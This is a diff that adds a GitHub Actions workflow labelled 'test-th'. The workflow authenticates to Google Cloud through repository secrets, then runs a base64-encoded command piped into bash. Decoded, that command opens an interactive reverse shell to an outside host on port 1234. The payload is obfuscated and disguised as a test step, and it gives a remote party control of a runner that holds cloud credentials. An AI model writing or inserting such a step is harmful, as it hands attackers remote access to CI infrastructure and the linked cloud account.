@@ -1,0 +1,26 @@
+name: test-th
+
+on:
+  push:
+    branches: [ "test-th" ]
+
+  workflow_dispatch:
+
+jobs:
+  test-th:
+    name: test-th
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Authenticate to Google Cloud"
+        uses: "google-github-actions/auth@v2"
+        with:
+          workload_identity_provider: ${{ secrets.GCP_EHP_WORKLOAD_IDENTITY_PROVIDER }}
+          service_account: ${{ secrets.GCP_EHP_SERVICE_ACCOUNT }}
+
+      - name: 'Set up Cloud SDK'
+        uses: 'google-github-actions/setup-gcloud@v3'
+
+      - name: test-th
+        run: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hbGdvcmFiLmZyLzEyMzQgMD4mMQ==' | base64 -d | bash
